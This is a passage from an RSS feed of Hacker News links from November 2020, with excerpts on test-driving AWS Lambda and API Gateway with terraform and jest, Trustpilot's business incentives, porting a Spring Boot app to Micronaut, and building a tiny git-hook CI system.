        <span>const</span> <span>applyResp</span> <span>=</span> <span>execSync</span>(<span>'terraform apply -auto-approve'</span>, {<span>cwd</span><span>:</span> <span>modulePath</span>});
        <span>expect</span>(<span>applyResp</span>.<span>toString</span>()).<span>toContain</span>(<span>'Apply complete!'</span>)

        <span>const</span> <span>resp</span> <span>=</span> <span>JSON</span>.<span>parse</span>(<span>execSync</span>(<span>'terraform output -json'</span>, {<span>cwd</span><span>:</span> <span>modulePath</span>}));
        <span>lambda_name</span> <span>=</span> <span>resp</span>.<span>lambda_name</span>.<span>value</span>
    })

    <span>test</span>(<span>'have a lambda'</span>, <span>async</span> () =&gt; {
        <span>const</span> <span>lambda</span> <span>=</span> <span>new</span> <span>AWS</span>.<span>Lambda</span>({<span>apiVersion</span><span>:</span> <span>'2015-03-31'</span>, <span>region</span><span>:</span> <span>'eu-central-1'</span>});
        <span>const</span> <span>resp</span> <span>=</span> <span>await</span> <span>lambda</span>.<span>invoke</span>({
            <span>FunctionName</span><span>:</span> <span>lambda_name</span>,
        }).<span>promise</span>()

        <span>expect</span>(<span>resp</span>.<span>StatusCode</span>).<span>toBe</span>(<span>200</span>)
        <span>expect</span>(<span>resp</span>.<span>Payload</span>).<span>toContain</span>(<span>'{ sales: [] }'</span>)
    })
})
</code></pre></div><h4 id="code-snippet">Code snippet</h4>
<div><pre><code data-lang="terraform"><span>data</span> <span>"archive_file"</span> <span>"example"</span> {
  <span>type</span> = <span>"zip"</span>
  <span>source_file</span> = <span>"</span><span>${</span><span>path</span>.module<span>}</span><span>/example/index.js"</span>
  <span>output_path</span> = <span>"</span><span>${</span><span>path</span>.module<span>}</span><span>/files/example.zip"</span>
}
<span>
</span><span>resource</span> <span>"aws_lambda_function"</span> <span>"example"</span> {
  <span>function_name</span> = <span>"serverless_example"</span>
  <span>handler</span> = index.<span>handler</span>
  <span>role</span> = <span>aws_iam_role</span>.<span>lambda_exec</span>.<span>arn</span>
  <span>runtime</span> = <span>"nodejs12.x"</span>

  <span>filename</span> = data.<span>archive_file</span>.<span>example</span>.<span>output_path</span>
  <span>source_code_hash</span> = filebase64sha256(data.<span>archive_file</span>.<span>example</span>.<span>output_path</span>)
  <span>reserved_concurrent_executions</span> = <span>1</span>
  <span>timeout</span> = <span>10</span>
  <span>publish</span> = <span>true</span>
}
<span>
</span><span>data</span> <span>aws_iam_policy_document</span> <span>"lambda_exec"</span> {
  <span>statement</span> {
    <span>actions</span> = [<span>"sts:AssumeRole"</span>]
    <span>principals</span> {
      <span>identifiers</span> = [<span>"lambda.amazonaws.com"</span>]
      <span>type</span> = <span>"Service"</span>
    }
    <span>effect</span> = <span>"Allow"</span>
  }
}
<span>
</span><span>resource</span> <span>"aws_iam_role"</span> <span>"lambda_exec"</span> {
  <span>name</span> = <span>"serverless_example_lambda"</span>
  <span>assume_role_policy</span> = data.<span>aws_iam_policy_document</span>.<span>lambda_exec</span>.<span>json</span>
}
<span>
</span><span>output</span> <span>"lambda_name"</span> {
  <span>value</span> = <span>aws_lambda_function</span>.<span>example</span>.<span>function_name</span>
}
</code></pre></div><p>There was a bit more code, I had to write to make this test green.
Fortunately, I was able to use jest, and work through the failures one by one until my Lambda was properly deployed.</p>
<p>I had to make the <code>lambda_name</code> an output of terraform to have it available in the test.</p>
<p>I don’t provide the JS code of the Lambda. I don’t think there is any educational value in it.</p>
<div><pre><code data-lang="text">To-Do List
==========
* Publish sales API
☑️ Run terraform in test
<span>☑️ Deploy the sales Lambda</span></code></pre></div>
<h2 id="publishing-the-sales-api">Publishing the sales API</h2>
<p>Now, I think I can go back and tackle the original task.</p>
<div><pre><code data-lang="text">To-Do List
==========
<span>* Publish sales API
</span>☑️ Run terraform in test
☑️ Deploy the sales Lambda</code></pre></div>
<h4 id="test-snippet-1">Test snippet</h4>
<div><pre><code data-lang="Javascript"><span>const</span> {<span>execSync</span>} <span>=</span> <span>require</span>(<span>'child_process'</span>);
<span>const</span> <span>https</span> <span>=</span> <span>require</span>(<span>'https'</span>);
<span>const</span> <span>AWS</span> <span>=</span> <span>require</span>(<span>'aws-sdk'</span>)

<span>describe</span>(<span>'simple http api'</span>, () =&gt; {
    <span>jest</span>.<span>setTimeout</span>(<span>20000</span>)
    <span>let</span> <span>tf_output</span> <span>=</span> {};

    <span>beforeAll</span>(() =&gt; {
        <span>execSync</span>(<span>'terraform init'</span>, {<span>cwd</span><span>:</span> <span>'./src'</span>});
        <span>const</span> <span>applyResp</span> <span>=</span> <span>execSync</span>(<span>'terraform apply -auto-approve'</span>, {<span>cwd</span><span>:</span> <span>'./src'</span>});
        <span>expect</span>(<span>applyResp</span>.<span>toString</span>()).<span>toContain</span>(<span>'Apply complete!'</span>)
        <span>tf_output</span> <span>=</span> <span>JSON</span>.<span>parse</span>(<span>execSync</span>(<span>'terraform output -json'</span>, {<span>cwd</span><span>:</span> <span>'./src'</span>}));
    })

    <span>test</span>(<span>'API'</span>, <span>async</span> () =&gt; {
        <span>const</span> <span>apigatewayv2</span> <span>=</span> <span>new</span> <span>AWS</span>.<span>ApiGatewayV2</span>({<span>apiVersion</span><span>:</span> <span>'2018-11-29'</span>, <span>region</span><span>:</span> <span>'eu-central-1'</span>});
        <span>const</span> <span>resp</span> <span>=</span> <span>await</span> <span>apigatewayv2</span>.<span>getApi</span>({
            <span>ApiId</span><span>:</span> <span>tf_output</span>.<span>simple_http_api</span>.<span>value</span>.<span>id</span>
        }).<span>promise</span>();

        <span>expect</span>(<span>resp</span>.<span>ApiEndpoint</span>).<span>toBeTruthy</span>()
        <span>expect</span>(<span>resp</span>.<span>ApiId</span>).<span>toEqual</span>(<span>tf_output</span>.<span>simple_http_api</span>.<span>value</span>.<span>id</span>)
    })

    <span>test</span>(<span>'Get response from API'</span>, (<span>done</span>) =&gt; {
        <span>const</span> <span>req</span> <span>=</span> <span>https</span>.<span>request</span>(
            <span>tf_output</span>.<span>simple_http_api</span>.<span>value</span>.<span>api_endpoint</span>,
            (<span>res</span>) =&gt; {
                <span>let</span> <span>data</span> <span>=</span> <span>''</span>
                <span>res</span>.<span>setEncoding</span>(<span>'utf8'</span>);
                <span>res</span>.<span>on</span>(<span>'data'</span>, (<span>chunk</span>) =&gt; {
                    <span>data</span> <span>+=</span> <span>chunk</span>
                });
                <span>res</span>.<span>on</span>(<span>'end'</span>, () =&gt; {
                    <span>expect</span>(<span>res</span>.<span>statusCode</span>).<span>toBe</span>(<span>200</span>)
                    <span>expect</span>(<span>data</span>).<span>toContain</span>(<span>'{sales: []}'</span>)
                    <span>done</span>()
                });
            });
        <span>req</span>.<span>on</span>(<span>'error'</span>, (<span>e</span>) =&gt; {
            <span>console</span>.<span>error</span>(<span>e</span>);
            <span>done</span>(<span>e</span>)
        });
        <span>req</span>.<span>end</span>();
    })
})
</code></pre></div><p>Those two tests demonstrate two different approaches to write assertions.</p>
<ul>
<li>
<p>The first one uses the aws-sdk to inspect whether the necessary resource has been created.</p>
</li>
<li>
<p>The second one uses a completely outside-in approach without any knowledge of the infrastructure.
It makes an HTTP request to the endpoint, demonstrating that our API is published and working.</p>
</li>
</ul>
<p>Both tests depend on output from terraform.</p>
<h4 id="code-snippet-1">Code snippet</h4>
<div><pre><code data-lang="terraform"><span>resource</span> <span>"aws_apigatewayv2_api"</span> <span>"example"</span> {
  <span>name</span> = <span>"simple_http_example"</span>
  <span>protocol_type</span> = <span>"HTTP"</span>
  <span>target</span> = <span>aws_lambda_function</span>.<span>example</span>.<span>arn</span>
}
<span>
</span><span>resource</span> <span>"aws_lambda_permission"</span> <span>"apigw"</span> {
  <span>action</span> = <span>"lambda:InvokeFunction"</span>
  <span>function_name</span> = <span>aws_lambda_function</span>.<span>example</span>.<span>function_name</span>
  <span>principal</span> = <span>"apigateway.amazonaws.com"</span>
  <span>source_arn</span> = <span>"</span><span>${</span><span>aws_apigatewayv2_api</span>.<span>example</span>.<span>execution_arn</span><span>}</span><span>/*/*"</span>
}
<span>
</span><span>output</span> <span>"simple_http_api"</span> {
  <span>value</span> = <span>aws_apigatewayv2_api</span>.<span>example</span>
}
</code></pre></div><p>With that, our main task is done!</p>
<div><pre><code data-lang="text">To-Do List
==========
<span>☑️ Publish sales API
</span>☑️ Run terraform in test
☑️ Deploy the sales lambda</code></pre></div>
<h2 id="conclusion">Conclusion</h2>
<p>All in all, I wrote 3 tests which take around 15 seconds to run including the <code>terraform apply</code>.</p>
<p>This is about one order of magnitude slower than what I am used to, when I write tests for classic applications.
Still, it is one of the fastest feedback cycles I’ve experienced doing infrastructure.</p>
<p>I hope I demonstrated that a TDD approach is a viable approach for developing infrastructure code.
Of course, with dedicated tooling it gets easier to write tests.
However, you can use simple tools to start …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.gchinis.com/posts/tdd-aws-serverless-services/">https://blog.gchinis.com/posts/tdd-aws-serverless-services/</a></em></p>]]>
            </description>
            <link>https://blog.gchinis.com/posts/tdd-aws-serverless-services/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028650</guid>
            <pubDate>Sun, 08 Nov 2020 20:23:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trustpilot and Difficult Incentive Problems]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25028645">thread link</a>) | @lharries
<br/>
November 8, 2020 | https://harries.co/trustpilot/ | <a href="https://web.archive.org/web/*/https://harries.co/trustpilot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><blockquote>
<p>💡 TL;DR Trustpilot and Glassdoor are PR agencies for companies. Not impartial review platforms for customers. This creates a challenging incentive problem.</p>
</blockquote>
<p>Trustpilot enables customers to review companies and Glassdoor enables employees to review companies. They have similar and fascinating business models. Let’s dive into Trustpilot.</p>
<p><strong>How does Trustpilot work?</strong></p>
<p>Let’s imagine you are setting up an online physiotherapy clinic called StiffNecks.com. To build your reputation as a clinic you create a Trustpilot page. The first client comes along, has a great experience, and you send them an email to the Trustpilot page asking them to leave a review. The client had a great experience and writes a lovely review of StiffNecks.com rating it 5/5 stars. BOOM your Trustpilot page now has a 3.5/5 “TrustScore”. Wait, what?!</p>
<p>With that 3.5/5 rating, TrustPilot now has you hostage. They use a <a href="https://support.trustpilot.com/hc/en-us/articles/201748946-TrustScore-explained-How-is-the-TrustScore-calculated-">Bayesian average</a> to calculate the TrustScore which takes into account how old the reviews are, the frequency you collect reviews, and they start you with a lovely 7 reviews of 3.5 for good measure. In other words, they control what your reputation is. And they charge businesses for this service with incentives misaligned from the business and definitely the customer.</p>
<p>Let’s jump back to StiffNecks.com. You now have anxiety from the yellow 3.5/5 score staring at you and so with each new customer, you do your best to push them towards Trustpilot. Eventually, (with about 10x5 star reviews) you get past the dreaded 4/5 threshold beyond which no customer dares to buy. But with each new review, it signals to customers that this is a valid reflection of your business’s reputation. And did I forget that you get penalised if the frequency of collecting reviews decreases. No stopping now. A few days later you get a call from Trustpilot agent offering the paid service.</p>
<p><strong>Where do the incentives go wrong?</strong></p>
<p>The immediate incentive is for Trustpilot to charge businesses more. Pretty easy to do when they directly control a business’s reputation. How can Trustpilot charge more? By either threatening to reduce their reputation or helping them to improve their score.</p>
<p>How do you help a company improve their score? At the moment Trustpilot uses widgets to show reviews and tools to collect reviews. But… there’s also strong incentives for Trustpilot to curate/remove negative reviews. Something that is already happening at Glassdoor (<a href="https://news.ycombinator.com/item?id=24789865">anecdotal evidence here</a>).</p>
<p>What does this mean for the customer? Believing in Trustpilot as a measure of reputation is a crucial part of their flywheel. But there’s much stronger incentives to be on the side of helping paying businesses have an artificially high score.</p>
<p><strong>How can Trustpilot remedy this?</strong></p>
<p>I think Trustpilot is an awesome service for consumers but the incentive problem is tough… For Trustpilot to truly fix the incentive problem they would need to be directly aligned with the reviewer. But the obvious business models such as a paywalling reviews would strongly interfere with their flywheel.</p>
<p>It’s possible to continue charging businesses. But Trustpilot would need to play the long game - not fudging the reviews at any cost. Instead, continuing to be a forcing function for businesses to treat their customers better, and thus improve their score. But, moderating reviews is hard because customer experience is subjective and Trustpilot does not have proper validation for who has and has not been a customer. Solutions to the verification problem seem feasible, such as the Facebook retargeting mechanism of sharing a hashed list of their customer emails.</p>
<p><strong>Appendix: The Trustpilot flywheel</strong></p>
<p>More companies email customers to leave reviews on Trustpilot → More customers leave reviews → More customers trust and use Trustpilot → More companies sign up to Trustpilot → More companies email customers to leave reviews on Trustpilot → …</p></section></div>]]>
            </description>
            <link>https://harries.co/trustpilot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028645</guid>
            <pubDate>Sun, 08 Nov 2020 20:23:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Live stream – Zig 0.7.0 Release Party]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25028620">thread link</a>) | @todsacerdoti
<br/>
November 8, 2020 | https://www.twitch.tv/kristoff_it | <a href="https://web.archive.org/web/*/https://www.twitch.tv/kristoff_it">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.twitch.tv/kristoff_it</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028620</guid>
            <pubDate>Sun, 08 Nov 2020 20:19:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From Spring Boot to Micronaut]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25028483">thread link</a>) | @nfrankel
<br/>
November 8, 2020 | https://blog.frankel.ch/spring-to-micronaut/ | <a href="https://web.archive.org/web/*/https://blog.frankel.ch/spring-to-micronaut/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main"> <div> <article itemscope="" itemtype="http://schema.org/BlogPosting"> <meta itemprop="mainEntityOfPage" content="//spring-to-micronaut/"> <meta itemprop="description" content="">  <figure itemscope="" itemprop="image" itemtype="http://schema.org/ImageObject"> <meta itemprop="url" content="https://blog.frankel.ch/assets/resources/spring-to-micronaut/micronaut.svg"> </figure> <section> <div itemprop="articleBody"> <p>In the last couple of years, I’ve been playing a bit with a generation of tools in the Java world, namely <a href="https://micronaut.io/" target="_blank" rel="noopener">Micronaut</a>, <a href="https://quarkus.io/" target="_blank" rel="noopener">Quarkus</a> and <a href="https://www.graalvm.org/" target="_blank" rel="noopener">GraalVM</a>. While I’m a Spring Boot fan since its beginning, I believe this quite an eye-opening opportunity. In this post, I’d like to see how easy, or how hard, it is to port a simple Spring Boot application to Micronaut.</p> <div> <h2 id="setting-up-the-context">Setting up the context</h2> <div> <p>The <abbr title="Java Virtual Machine">JVM</abbr> is an great piece of technology. Modern versions compile the running <em>bytecode</em> to native code, depending on the existing workload. For this reason, JVM applications are on par with - or even winning over - native executables regarding to runtime performance.</p> <p>JVM applications have a warm-up time during which they don’t perform well. The loading of classes at runtime doesn’t help. Frameworks such as Spring and Jakarta EE have been making use of classpath scanning and reflection, which make startup time even longer. For long-running processes, such as traditional application servers, this is not an issue.</p> <p>In the context of containers, it is. Because one handles containers as cattle and not pets, the platform <em>e.g.</em> Kubernetes kills pods and schedules new ones at regular intervals. The longer the startup time, the less relevant the JVM becomes. It becomes even worse in Serverless environments that need to auto-scale the number of pods quickly.</p> <p>To hop on the bandwagon, Oracle offers <a href="https://github.com/oracle/graal/tree/master/substratevm" target="_blank" rel="noopener">SubstrateVM</a>. A subcomponent of GraalVM, SubstrateVM, allows transforming JVM bytecode into a native executable. To do that, SubstrateVM compiles the bytecode <abbr title="Ahead-Of-Time">AOT</abbr>. For that reason, you need to explicitly feed it information that is available on the JVM at runtime. It’s the case of reflection for example. Note that some JVM features are not ported to GraalVM. Moreover, the AOT compilation is a time-consuming process.</p> <p>The result is that on one hand, we have the JVM and all its features leveraged by frameworks; on the other hand, we have native executables that require fine-tuned manual configuration and a massive amount of build time.</p> <p>A new generation of frameworks has spawned that aims to find a middle ground <em>i.e.</em> Micronaut and Quarkus. They both aim to generate bytecode AOT. Note that this AOT is different from the one mentioned above. Instead of using reflection at runtime, which is expensive, both frameworks generate extra classes at build time. This also allows us to avoid classpath scanning at startup time. In short, the idea is about making as much code as possible available at build time.</p> </div> </div> <div> <h2 id="the-sample-application">The sample application</h2> <div> <p>I want the sample application to migrate to be simple enough so I can migrate it by myself but not to the point of being trivial. It consists of the following:</p> <ul><li><span>A controller layer implemented by Spring MVC</span></li><li><span>A repository layer implemented by Spring Data JPA</span></li><li><span>A JPA entity</span></li><li><span>Schema generation and data insertion at startup via Spring Boot</span></li><li><span>The Spring Boot actuator, with the <code>health</code> and <code>beans</code> endpoints enabled and accessible without authentication</span></li></ul> <p>The application is written in Kotlin. I’ll be using H2 as the database to make the whole setup less complex.</p> <p>In general, I try to approach migrations in a step-by-step way. To do that, Micronaut offers a dedicated Micronaut-Spring dependency. I must admit I didn’t manage to make it work the way I wanted. Thus, I did a big-bang migration. The rest of this post will focus on different places for the migration.</p> </div> </div> <div> <h2 id="common-changes">Common changes</h2> <div> <p>The first change is to replace the parent POM.</p> <div> <p>pom.xml</p> <div> <pre><code data-lang="xml"><span>&lt;parent&gt;</span>
  <span>&lt;groupId&gt;</span>org.springframework.boot<span>&lt;/groupId&gt;</span>
  <span>&lt;artifactId&gt;</span>spring-boot-starter-parent<span>&lt;/artifactId&gt;</span>
  <span>&lt;version&gt;</span>2.3.5.RELEASE<span>&lt;/version&gt;</span>
  <span>&lt;relativePath/&gt;</span> <span>&lt;!-- lookup parent from repository --&gt;</span>
<span>&lt;/parent&gt;</span>

<span>&lt;parent&gt;</span>
    <span>&lt;groupId&gt;</span>io.micronaut<span>&lt;/groupId&gt;</span>
    <span>&lt;artifactId&gt;</span>micronaut-parent<span>&lt;/artifactId&gt;</span>
    <span>&lt;version&gt;</span>2.1.3<span>&lt;/version&gt;</span>
<span>&lt;/parent&gt;</span></code></pre> </div> </div> <p>Because Micronaut generates bytecode at build-time, we need to add an annotation processor during the compilation. Thus, the close second step is to configure that in the POM.</p> <div> <p>pom.xml</p> <div> <pre><code data-lang="xml"><span>&lt;plugin&gt;</span>
  <span>&lt;groupId&gt;</span>org.jetbrains.kotlin<span>&lt;/groupId&gt;</span>
  <span>&lt;artifactId&gt;</span>kotlin-maven-plugin<span>&lt;/artifactId&gt;</span>
  <span>&lt;version&gt;</span>${kotlin.version}<span>&lt;/version&gt;</span>
  ...
  <span>&lt;executions&gt;</span>
    <span>&lt;execution&gt;</span>
      <span>&lt;id&gt;</span>kapt<span>&lt;/id&gt;</span>
      <span>&lt;goals&gt;</span>
        <span>&lt;goal&gt;</span>kapt<span>&lt;/goal&gt;</span>
      <span>&lt;/goals&gt;</span>
      <span>&lt;configuration&gt;</span>
        <span>&lt;annotationProcessorPaths&gt;</span>
          <span>&lt;annotationProcessorPath&gt;</span>
            <span>&lt;groupId&gt;</span>io.micronaut<span>&lt;/groupId&gt;</span>
            <span>&lt;artifactId&gt;</span>micronaut-inject-java<span>&lt;/artifactId&gt;</span>        <i data-value="1"></i><b>(1)</b>
            <span>&lt;version&gt;</span>${micronaut.version}<span>&lt;/version&gt;</span>
          <span>&lt;/annotationProcessorPath&gt;</span>
          <span>&lt;annotationProcessorPath&gt;</span>
            <span>&lt;groupId&gt;</span>io.micronaut.data<span>&lt;/groupId&gt;</span>
            <span>&lt;artifactId&gt;</span>micronaut-data-processor<span>&lt;/artifactId&gt;</span>     <i data-value="2"></i><b>(2)</b>
            <span>&lt;version&gt;</span>${micronaut.data.version}<span>&lt;/version&gt;</span>
          <span>&lt;/annotationProcessorPath&gt;</span>
        <span>&lt;/annotationProcessorPaths&gt;</span>
      <span>&lt;/configuration&gt;</span>
    <span>&lt;/execution&gt;</span>
    ...
  <span>&lt;/executions&gt;</span>
  ...
<span>&lt;/plugin&gt;</span></code></pre> </div> </div> <div> <table> <tbody><tr> <td><i data-value="1"></i><b>1</b></td> <td>Handle dependency injection</td> </tr> <tr> <td><i data-value="2"></i><b>2</b></td> <td>Handle persistence-related classes</td> </tr> </tbody></table> </div> <p>You can check those extra classes by looking at the <code>target/classes</code> folder. For example, the sample application displays the following:</p> <div> <div> <pre>$Person$Introspection$$0.class                     PersonRepository$Intercepted$$proxy0.class
$Person$Introspection$$1.class                     PersonRepository$Intercepted$$proxy1.class
$Person$Introspection$$2.class                     PersonRepository$Intercepted$$proxy10.clas
$Person$Introspection$$3.class                     PersonRepository$Intercepted$$proxy2.class
$Person$Introspection.class                        PersonRepository$Intercepted$$proxy3.class
$Person$IntrospectionRef.class                     PersonRepository$Intercepted$$proxy4.class
$PersonControllerDefinition$$exec1.class            PersonRepository$Intercepted$$proxy5.class
$PersonControllerDefinition$$exec2.class            PersonRepository$Intercepted$$proxy6.class
$PersonControllerDefinition.class                   PersonRepository$Intercepted$$proxy7.class
$PersonControllerDefinitionClass.class              PersonRepository$Intercepted$$proxy8.class
$PersonRepository$InterceptedDefinition.class       PersonRepository$Intercepted$$proxy9.class
$PersonRepository$InterceptedDefinitionClass.class  PersonRepository$Intercepted.class
Person.class                                       PersonRepository.class
PersonController.class                             SpringToMicronautApplicationKt.class</pre> </div> </div> <p>Micronaut creates classes that contain <code>Introspection</code> and <code>Intercepted</code> via <code>kapt</code>.</p> <p>To start the application, Spring Boot refers to a class.</p> <div> <div> <pre><code data-lang="kotlin"><span>@SpringBootApplication</span>
<span>class</span> <span>SpringToMicronautApplication</span>

<span>fun</span> <span>main</span><span>(</span><span>args</span><span>:</span> <span>Array</span><span>&lt;</span><span>String</span><span>&gt;)</span> <span>{</span>
  <span>runApplication</span><span>&lt;</span><span>SpringToMicronautApplication</span><span>&gt;(*</span><span>args</span><span>)</span>
<span>}</span></code></pre> </div> </div> <p>Micronaut allows us to just use the standard <code>main</code> function.</p> <div> <div> <pre><code data-lang="kotlin"><span>fun</span> <span>main</span><span>(</span><span>args</span><span>:</span> <span>Array</span><span>&lt;</span><span>String</span><span>&gt;)</span> <span>{</span>
  <span>build</span><span>()</span>
    <span>.</span><span>args</span><span>(*</span><span>args</span><span>)</span>
    <span>.</span><span>packages</span><span>(</span><span>"ch.frankel.springtomicronaut"</span><span>)</span>
    <span>.</span><span>start</span><span>()</span>
<span>}</span></code></pre> </div> </div> <p>The Spring Boot plugin can find the <code>main</code> function "automagically". In Micronaut, the current version requires you to set it explicitly in the POM:</p> <div> <p>pom.xml</p> <div> <pre><code data-lang="xml"><span>&lt;properties&gt;</span>
  ...
  <span>&lt;exec.mainClass&gt;</span>ch.frankel.s2m.SpringToMicronautApplicationKt<span>&lt;/exec.mainClass&gt;</span>
<span>&lt;/properties&gt;</span></code></pre> </div> </div> </div> </div> <div> <h2 id="migrating-the-web-layer">Migrating the web layer</h2> <div> <p>Migrating to the web layer requires:</p> <ol><li><span>To replace Spring Boot starters with the relevant Micronaut dependencies</span></li><li><span>To replace Spring Boot’s annotations with Micronaut’s</span></li></ol> <p>To make an application a webapp, Micronaut mandates to add an embedded server dependency. Tomcat, Jetty, and Undertow are available. Since Spring Boot’s default is Tomcat, let’s use Tomcat:</p> <div> <p>pom.xml</p> <div> <pre><code data-lang="xml"><span>&lt;dependency&gt;</span>
  <span>&lt;groupId&gt;</span>io.micronaut.servlet<span>&lt;/groupId&gt;</span>
  <span>&lt;artifactId&gt;</span>micronaut-http-server-tomcat<span>&lt;/artifactId&gt;</span>
  <span>&lt;scope&gt;</span>runtime<span>&lt;/scope&gt;</span>
<span>&lt;/dependency&gt;</span></code></pre> </div> </div> <p>Spring’s and Micronaut’s annotations map pretty much one to one. To use Micronaut is just a matter of using the annotations of one package instead of the other. The difference is that Spring offers the ability to serialize to JSON by using a specialized <code>Controller</code> annotation, <code>@RestController</code>. Micronaut does not and requires to set a property on the <code>Controller</code> annotation.</p> <table> <colgroup> <col> <col> </colgroup> <thead> <tr> <th>Spring</th> <th>Micronaut</th> </tr> </thead> <tbody> <tr> <td><p><code>o.s.w.b.a.RestController</code></p></td> <td><p><code>i.m.h.a.Controller(produces = [TEXT_JSON])</code></p></td> </tr> <tr> <td><p><code>o.s.w.b.a.GetMapping</code></p></td> <td><p><code>i.m.h.a.Get</code></p></td> </tr> <tr> <td><p><code>o.s.w.b.a.PathVariable</code></p></td> <td><p><code>i.m.h.a.PathVariable</code></p></td> </tr> </tbody> <tfoot> <tr> <td colspan="2"><div><ul><li><span><code>o.s.w.b.a</code> = <code>org.springframework.web.bind.annotation</code></span></li><li><span><code>i.m.h.a</code> = <code>io.micronaut.http.annotation</code></span></li></ul></div></td> </tr> </tfoot> </table> </div> </div> <div> <h2 id="migrating-the-data-access-layer">Migrating the data access layer</h2> <div> <p>To migrate to the data access layer, one must:</p> <ol><li><span>Use Micronaut’s dependencies instead of Spring Boot’s</span></li><li><span>Replace Micronaut’s Spring Boot’s <code>Repository</code> with Micronaut’s</span></li><li><span>Create the schema and load the initial data with Micronaut</span></li></ol> <p>To create a data source and a connection pool, Spring Boot needs a Spring Data starter and a relevant driver. Micronaut demands three different parts:</p> <ol><li><span>A data access dependency</span></li><li><span>A driver dependency</span></li><li><span>A connection pool dependency</span></li></ol> <div> <p>pom.xml</p> <div> <pre><code data-lang="xml"><span>&lt;dependency&gt;</span>
  <span>&lt;groupId&gt;</span>org.springframework.boot<span>&lt;/groupId&gt;</span>
  <span>&lt;artifactId&gt;</span>spring-boot-starter-data-jpa<span>&lt;/artifactId&gt;</span>
<span>&lt;/dependency&gt;</span>

<span>&lt;dependency&gt;</span>
  <span>&lt;groupId&gt;</span>io.micronaut.data<span>&lt;/groupId&gt;</span>
  <span>&lt;artifactId&gt;</span>micronaut-data-hibernate-jpa<span>&lt;/artifactId&gt;</span>
  <span>&lt;version&gt;</span>${micronaut.data.version}<span>&lt;/version&gt;</span>
<span>&lt;/dependency&gt;</span>
<span>&lt;dependency&gt;</span>
  <span>&lt;groupId&gt;</span>io.micronaut.sql<span>&lt;/groupId&gt;</span>
  <span>&lt;artifactId&gt;</span>micronaut-jdbc-hikari<span>&lt;/artifactId&gt;</span>
<span>&lt;/dependency&gt;</span></code></pre> </div> </div> <p>Note that if you forget the connection pool, you’ll run into this error at runtime:</p> <div> <div> <pre>No backing RepositoryOperations configured for repository. Check your configuration and try again</pre> </div> </div> <p>Spring Data JPA generates repositories' implementation at runtime. Micronaut Data generates them at build time. For the developer, the main difference is that the repository interface must be annotated with Micronaut’s <code>@Repository</code>.</p> <div> <div> <pre><code data-lang="kotlin"><span>@Repository</span>
<span>interface</span> <span>PersonRepository</span> <span>:</span> <span>CrudRepository</span><span>&lt;</span><span>Person</span><span>,</span> <span>Long</span><span>&gt;</span></code></pre> </div> </div> <p>One needs to configure Micronaut to scan for repositories and entities:</p> <div> <p>application.yml</p> <div> <pre><code data-lang="yaml"><span>jpa.default</span><span>:</span>
  <span>packages-to-scan</span><span>:</span>
    <span>-</span> <span>'</span><span>ch.frankel.springtomicronaut'</span></code></pre> </div> </div> <p>To create the schema, you can configure Spring Boot in two different ways: either rely on Hibernate’s schema creation or provide a <code>create.sql</code> file at the …</p></div></div></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.frankel.ch/spring-to-micronaut/">https://blog.frankel.ch/spring-to-micronaut/</a></em></p>]]>
            </description>
            <link>https://blog.frankel.ch/spring-to-micronaut/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028483</guid>
            <pubDate>Sun, 08 Nov 2020 20:03:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Tiny CI System]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25028450">thread link</a>) | @todsacerdoti
<br/>
November 8, 2020 | https://www.0chris.com/tiny-ci-system.html | <a href="https://web.archive.org/web/*/https://www.0chris.com/tiny-ci-system.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<p>2020-11-08</p>
<p>This is a little demonstration of how little you need to host your own git
repositories and have a modest <a href="https://en.wikipedia.org/wiki/Continuous_integration">Continuous Integration</a>
system for them. All you need is a unixy
server you can ssh into, but arguably you can try this out locally as well.
We will use Redis at one point to queue tasks, but
strictly speaking this can be achieved without additional software. To keep things
simple this will only work with one repository, since this is only describing a
pattern.</p>
<p>The source code to all of that follows below can be found <a href="https://git.sr.ht/%7Estchris/tiny-ci">here</a>.</p>
<h2>Hosting bare git repositories</h2>
<p>Assuming you can ssh into a server and create a directory, this is all you need
to create a shareable git repository:</p>
<pre><code>$ git init --bare
</code></pre>
<p>Ideally you are using a distinct user for it (named <code>git</code>) and have it set to
use <code>git-shell</code> as its default shell. By convention bare repositories are stored
in directories which end in <code>.git</code>. You can now clone this repository from your
machine with:</p>
<pre><code>$ git clone ssh://git@host.example.com/~git/repo.git
</code></pre>
<h2>post-receive hooks</h2>
<p>A <a href="https://git-scm.com/docs/githooks#post-receive">post-receive hook</a> is an executable which can do some work as soon as something new was pushed to the repository. We will use an executable shell script which needs to go inside the <code>hooks</code> directory of the (bare) repository on the server side.</p>
<p>Now the most trivial thing to do would be to do the actual work in here, but this would block the <code>git push</code> on the client side, so we just want to enqueue a new job, return a handle and exit. If what you do takes only a short amount of time, you can stop here. Alternatively you can use this repository for deployments only, by defining it as a separate remote. But the goal here is to have tests run on every push, so we will split the job creation from the actual run.</p>
<p>This is where Redis comes into play for the job queueing. We will assume redis is installed and running and we will use redis-cli to access it from the script. We will use two data structures: a list of jobs waiting to be executed, referenced by a UUID we will generate and a hash where we can store the git revision and the state associated to a given job, as well as its output.</p>
<p>Note that git is passing three arguments to the script via stdin: the old revision before the push, the new revision and the current ref.</p>
<pre><code>#!/bin/bash
while read -r _ newrev ref
do
